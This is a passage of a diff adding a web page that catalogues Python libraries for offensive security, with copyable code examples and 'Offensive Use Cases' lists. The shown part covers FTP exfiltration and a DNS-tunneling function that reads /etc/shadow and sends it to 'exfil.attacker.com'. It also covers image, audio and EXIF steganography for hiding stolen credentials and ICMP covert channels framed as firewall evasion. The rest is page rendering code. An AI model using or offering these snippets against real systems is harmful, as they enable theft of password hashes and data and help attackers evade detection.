+                    {name: "ftplib", description: "FTP-based exfiltration", import: "import ftplib", example: `import ftplib\nimport os\n\ndef ftp_exfil(local_dir, ftp_host, username, password):\n    ftp = ftplib.FTP(ftp_host)\n    ftp.login(username, password)\n    \n    for root, dirs, files in os.walk(local_dir):\n        for file in files:\n            local_path = os.path.join(root, file)\n            with open(local_path, 'rb') as f:\n                ftp.storbinary(f'STOR {file}', f)\n                print(f'Uploaded: {file}')\n    \n    ftp.quit()`, uses: ["FTP file upload", "Legacy protocol exfiltration", "Anonymous FTP drops", "Bulk data transfer", "Automated FTP uploads"]},
+                    {name: "dns.resolver", description: "DNS tunneling exfiltration", import: "import dns.resolver", example: `import dns.resolver\nimport base64\n\ndef dns_exfil(data, domain):\n    # Split data into DNS-safe chunks\n    chunk_size = 63\n    encoded = base64.b32encode(data.encode()).decode().lower()\n    \n    for i in range(0, len(encoded), chunk_size):\n        chunk = encoded[i:i+chunk_size]\n        query = f"{chunk}.{domain}"\n        try:\n            dns.resolver.resolve(query, 'A')\n        except:\n            pass  # Server logs the subdomain\n\n# Exfiltrate passwords\npasswords = open('/etc/shadow').read()\ndns_exfil(passwords, 'exfil.attacker.com')`, uses: ["DNS tunneling data theft", "Covert channel exfiltration", "Firewall bypass via DNS", "Small data exfiltration", "Stealth data theft"]}
+                ]
+            },
+            // CATEGORY 24 - Steganography & Covert Channels
+            {
+                name: "Steganography & Covert Channels",
+                description: "Hiding data in images, audio, video",
+                when_to_use: "Covert communication, data hiding, anti-forensics",
+                icon: "🕶️",
+                libraries: [
+                    {name: "stegano", description: "Image steganography", import: "from stegano import lsb", example: `from stegano import lsb\n\n# Hide secret data in image\nsecret_message = 'Stolen credentials: admin:password123'\nstego_image = lsb.hide('cover.png', secret_message)\nstego_image.save('innocent.png')\n\n# Extract hidden data\nrevealed = lsb.reveal('innocent.png')\nprint(f'Hidden message: {revealed}')`, uses: ["Hide data in images", "LSB steganography", "Covert data transmission", "Anti-forensics techniques", "Payload delivery via images"]},
+                    {name: "Pillow", description: "Image manipulation", import: "from PIL import Image", example: `from PIL import Image\nimport numpy as np\n\ndef hide_data(cover_path, data, output_path):\n    img = Image.open(cover_path)\n    img_array = np.array(img)\n    \n    # Hide data in LSB of pixels\n    data_bits = ''.join(format(ord(c), '08b') for c in data)\n    idx = 0\n    \n    for i in range(img_array.shape[0]):\n        for j in range(img_array.shape[1]):\n            if idx < len(data_bits):\n                img_array[i][j][0] = (img_array[i][j][0] & 0xFE) | int(data_bits[idx])\n                idx += 1\n    \n    Image.fromarray(img_array).save(output_path)`, uses: ["Custom steganography algorithms", "Pixel manipulation", "Image-based data hiding", "Visual steganography", "Metadata embedding"]},
+                    {name: "wave", description: "Audio file manipulation", import: "import wave", example: `import wave\nimport struct\n\ndef hide_in_audio(audio_file, data, output_file):\n    audio = wave.open(audio_file, 'rb')\n    frames = bytearray(list(audio.readframes(audio.getnframes())))\n    \n    # Convert data to binary\n    data_bits = ''.join(format(ord(c), '08b') for c in data)\n    \n    # Hide in LSB of audio samples\n    for i, bit in enumerate(data_bits):\n        frames[i] = (frames[i] & 0xFE) | int(bit)\n    \n    # Save modified audio\n    with wave.open(output_file, 'wb') as out:\n        out.setparams(audio.getparams())\n        out.writeframes(bytes(frames))`, uses: ["Audio steganography", "Hide data in sound files", "Covert audio channels", "Voice call data hiding", "Music file payloads"]},
+                    {name: "pyexiv2", description: "Image metadata manipulation", import: "import pyexiv2", example: `import pyexiv2\nimport base64\n\n# Hide data in EXIF metadata\nimg = pyexiv2.Image('photo.jpg')\nmetadata = img.read_exif()\n\n# Encode secret in comment field\nsecret = base64.b64encode(b'secret_data').decode()\nimg.modify_exif({'Exif.Image.ImageDescription': secret})\nimg.close()\n\n# Extract\nimg2 = pyexiv2.Image('photo.jpg')\nhidden = img2.read_exif()['Exif.Image.ImageDescription']\ndata = base64.b64decode(hidden)`, uses: ["EXIF metadata hiding", "Image comment data storage", "GPS data manipulation", "Timestamp hiding", "Camera info spoofing"]},
+                    {name: "scapy", description: "Network covert channels", import: "from scapy.all import *", example: `from scapy.all import *\nimport base64\n\n# Hide data in ICMP ping packets\ndef send_covert_icmp(data, target):\n    encoded = base64.b64encode(data.encode())\n    \n    for i in range(0, len(encoded), 32):\n        chunk = encoded[i:i+32]\n        packet = IP(dst=target)/ICMP()/Raw(load=chunk)\n        send(packet)\n\n# Extract from captured packets\ndef extract_covert(packets):\n    data = b''\n    for pkt in packets:\n        if pkt.haslayer(Raw):\n            data += pkt[Raw].load\n    return base64.b64decode(data)`, uses: ["ICMP tunnel covert channels", "Protocol-based data hiding", "Network steganography", "Covert network communication", "Firewall-evading channels"]}
+                ]
+            }
+        ];
+
+        let allLibraries = [];
+        let activeCategory = 'all';
+        categories.forEach(cat => {
+            cat.libraries.forEach(lib => {
+                allLibraries.push({...lib, category: cat.name});
+            });
+        });
+
+        function escapeHTML(str) {
+            return String(str)
+                .replace(/&/g, '&amp;')
+                .replace(/</g, '&lt;')
+                .replace(/>/g, '&gt;')
+                .replace(/\"/g, '&quot;')
+                .replace(/'/g, '&#39;');
+        }
+
+        function highlightCode(code) {
+            const escaped = String(code)
+                .replace(/&/g, '&amp;')
+                .replace(/</g, '&lt;')
+                .replace(/>/g, '&gt;');
+            return escaped
+                .replace(/\b(import|from|as|def|class|if|else|elif|for|while|try|except|with|return|print|open)\b/g, '<span class="keyword">$1</span>')
+                .replace(/("[^"]*"|'[^']*')/g, '<span class="string">$1</span>')
+                .replace(/(#.*$)/gm, '<span class="comment">$1</span>');
+        }
+
+        function createLibraryCard(library) {
+            const useCasesList = library.uses.map((use, idx) => {
+                const parts = use.split(' - ');
+                return `<li><strong>${idx + 1}. ${parts[0]}</strong> - ${parts[1] || ''}</li>`;
+            }).join('');
+
+            return `
+                <div class="library-item" data-library="${library.name.toLowerCase()}">
+                    <div class="library-header" onclick="toggleLibrary(this)">
+                        <div>
+                            <div class="library-name">${library.name}</div>
+                            <div class="library-description">${library.description}</div>
+                        </div>
+                        <span class="expand-icon">▼</span>
+                    </div>
+                    <div class="library-body">
+                        <div class="library-content">
+                            <div class="section">
+                                <div class="section-title">📦 Import Statement</div>
+                                <div class="code-block">
+                                    <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                                    <pre>${library.import}</pre>
+                                </div>
+                            </div>
+                            <div class="section">
+                                <div class="section-title">💻 Code Example</div>
+                                <div class="code-block">
+                                    <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                                    <pre>${highlightCode(library.example)}</pre>
+                                </div>
+                            </div>
+                            <div class="section">
+                                <div class="section-title">⚔️ Offensive Use Cases</div>
+                                <ul class="use-cases">
+                                    ${useCasesList}
+                                </ul>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            `;
+        }
+
+        function createCategoryCard(category) {
+            const librariesHTML = category.libraries.map(lib => createLibraryCard(lib)).join('');
+            
+            return `
+                <div class="category-card" data-category="${category.name.toLowerCase()}">
+                    <div class="category-header" onclick="toggleCategory(this)">
+                        <div class="category-info">
+                            <div class="category-title">
+                                <span class="category-icon">${category.icon}</span>
+                                <span>${category.name}</span>
+                            </div>
+                            <div class="category-description">${category.description}</div>
+                            <div class="category-when">When to use: ${category.when_to_use}</div>
+                        </div>
+                        <div class="category-meta">
+                            <span class="library-count">${category.libraries.length} libraries</span>
+                            <span class="expand-icon">▼</span>
+                        </div>
+                    </div>
+                    <div class="category-content">
+                        <div class="library-list">
+                            ${librariesHTML}
+                        </div>
+                    </div>
+                </div>
+            `;
+        }
+
+        function renderCategories() {
+            const container = document.getElementById('categoriesContainer');
+            container.innerHTML = categories.map(cat => createCategoryCard(cat)).join('');
+            updateResultCount();
+        }
+
+        function toggleCategory(element) {
+            const card = element.closest('.category-card');
+            card.classList.toggle('expanded');
+        }
+
+        function toggleLibrary(element) {
+            const item = element.closest('.library-item');
+            item.classList.toggle('expanded');
+        }
+
+        function copyCode(button) {
+            const codeBlock = button.nextElementSibling;
+            const text = codeBlock.textContent;
+            navigator.clipboard.writeText(text).then(() => {
+                const originalText = button.textContent;
+                button.textContent = 'Copied!';
+                button.classList.add('copied');
+                setTimeout(() => {
+                    button.textContent = originalText;
+                    button.classList.remove('copied');
+                }, 2000);
+            });
+        }
+
+        function applyFilters() {
+            const query = document.getElementById('searchInput').value.toLowerCase().trim();
+            const categoryCards = document.querySelectorAll('.category-card');
+            let visibleCount = 0;
+
+            categoryCards.forEach(card => {
+                const categoryName = card.dataset.category;
+                const categoryMatches = (activeCategory.toLowerCase() === 'all') || (activeCategory.toLowerCase() === categoryName);
+                const libraryItems = card.querySelectorAll('.library-item');
+                let hasVisibleLibrary = false;
+
+                libraryItems.forEach(item => {
+                    const content = item.textContent.toLowerCase();
+                    const queryMatch = !query || content.includes(query) || categoryName.includes(query);
+                    const show = categoryMatches && queryMatch;
+
+                    if (show) {
+                        item.classList.remove('hidden');
+                        hasVisibleLibrary = true;
+                        visibleCount++;
+                    } else {
+                        item.classList.add('hidden');
+                    }
+                });
+
+                if (hasVisibleLibrary) {
+                    card.classList.remove('hidden');
+                    if (query || activeCategory.toLowerCase() !== 'all') {
+                        card.classList.add('expanded');
+                    }
+                } else {
+                    card.classList.add('hidden');
+                }
+            });
+
+            if (!query && activeCategory.toLowerCase() === 'all') {
+                updateResultCount();
+            } else {
+                updateResultCount(visibleCount, query || activeCategory);
+            }
+        }
+
+        function updateResultCount(count, query) {
+            const resultDiv = document.getElementById('resultCount');
+            if (query) {
+                resultDiv.textContent = `Found ${count} matching libraries for "${query}"`;
+            } else {
+                const total = allLibraries.length;
+                resultDiv.textContent = `Showing all ${total} libraries across ${categories.length} categories`;
+            }
+        }
+
+        function renderCategoryFilters() {
+            const container = document.getElementById('categoryFilters');
+            const names = ['All', ...categories.map(c => c.name)];
+            container.innerHTML = names.map(name => {
+                const active = (activeCategory.toLowerCase() === name.toLowerCase()) ? 'active' : '';
+                return `<button class="chip ${active}" data-cat="${name}">${escapeHTML(name)}</button>`;
+            }).join('');
+            container.querySelectorAll('.chip').forEach(btn => {
+                btn.addEventListener('click', () => {
+                    activeCategory = btn.dataset.cat;
+                    renderCategoryFilters();
+                    applyFilters();
+                });
+            });
+        }
+
+        function expandAll() {
+            document.querySelectorAll('.category-card').forEach(card => {
+                card.classList.add('expanded');
+            });
+        }
+
+        function collapseAll() {
+            document.querySelectorAll('.category-card').forEach(card => {
+                card.classList.remove('expanded');
+            });
+            document.querySelectorAll('.library-item').forEach(item => {
+                item.classList.remove('expanded');
+            });
+        }
+
+        // Event listeners
+        document.getElementById('searchInput').addEventListener('input', applyFilters);
+
+        document.getElementById('expandAllBtn').addEventListener('click', expandAll);
+        document.getElementById('collapseAllBtn').addEventListener('click', collapseAll);
+
+        // Initialize
+        renderCategories();
+        renderCategoryFilters();
+    </script>
+</body>
+</html>
